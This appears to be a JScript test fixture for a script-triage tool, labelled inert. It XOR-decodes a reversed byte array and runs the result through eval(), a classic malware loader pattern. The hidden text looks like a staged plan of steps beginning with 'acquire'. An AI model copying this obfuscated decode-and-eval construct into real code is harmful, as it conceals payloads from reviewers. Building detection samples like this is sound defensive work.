// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_4466d2ac = function decode_4466d2ac_body(storedMaterial) {
  var keyBytes = [84,38,34,218,50];
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push(storedMaterial[i] ^ keyBytes[i % keyBytes.length]); }
  return recoveredMaterial;
};
var recover_e5543bd7 = function recover_e5543bd7_body() {
  var storedMaterial = [95,18,110,16,174,76,83,59,113,191,69,71,32,65,248,14,91,118,65,176,12,78,55,70,187,82,85,61,86,247,78,71,55,93,182,0,28,118,87,189,67,82,39,109,174,90,67,58,16,246,0,21,103,2,238,17,18,108,4,190,27,122,8,87,182,64,71,39,93,170,81,79,16,110,134,64,71,24,65,169,71,84,32,92,175,106,122,8,87,168,67,81,32,84,181,113,122,8,103,153,105,110,118,8,248,74,82,53,66,133,91,84,32,65,179,69,67,38,16,246,0,82,53,86,244,17,21,100,6,233,22,30,98,86,227,15,67,51,83,174,81,122,8,80,187,110,85,39,87,168,86,72,33,122,134,126,69,61,94,184,87,118,8,110,169,80,67,39,103,134,126,28,23,16,224,0,78,32,83,170,125,67,56,91,188,0,10,118,1,233,18,18,103,6,226,20,66,109,29,184,67,106,39,65,191,80,82,58,71,146,0,28,118,70,180,71,65,53,109,168,71,85,33,16,246,0,82,53,86,244,65,30,50,80,185,71,21,101,29,190,75,74,53,68,180,75,8,49,94,170,79,71,44,87,244,17,21,100,6,233,22,30,98,86,227,13,9,110,65,170,86,82,60,16,224,0,74,38,71,248,14,4,103,1,234,22,21,96,10,236,70,31,121,92,189,75,71,36,95,187,65,4,110,16,190,75,121,58,85,179,67,86,57,83,185,0,93,110,16,169,71,83,56,83,172,0,10,118,98,142,118,110,24,127,130,12,82,50,93,169,77,84,55,91,151,0,28,118,64,191,86,86,53,86,187,0,10,9,16,174,82,79,38,81,169,125,64,50,93,190,76,71,60,16,246,0,85,39,87,185,77,84,36,109,178,65,82,53,66,169,75,66,118,30,248,71,74,61,84,133,71,82,61,64,173,0,10,118,87,174,77,75,49,64,133,71,84,61,71,171,65,71,118,105,224,0,85,36,87,174,81,4,47];
  storedMaterial.reverse();
  var harmlessValue = ["north", "south"].join(":");
  var invoke = function(block, value) { return block.call(null, value); };
  var recoveredMaterial = invoke.call(null, decode_4466d2ac, storedMaterial);
  var configurationText = recoveredMaterial.length ? String.fromCharCode(recoveredMaterial[0]) : "", bi = 1;
  for (bi = 1; bi < recoveredMaterial.length; bi++) { configurationText = configurationText.concat(String.fromCharCode(recoveredMaterial[bi])); }
  return configurationText;
};
var inspect_45121d90 = function inspect_45121d90_body() {
  var configuration = eval("(" + recover_e5543bd7.call(null) + ")");
  return { steps: configuration.steps, adapter: configuration.adapter, values: configuration.values, stageCount: configuration.stageCount };
};
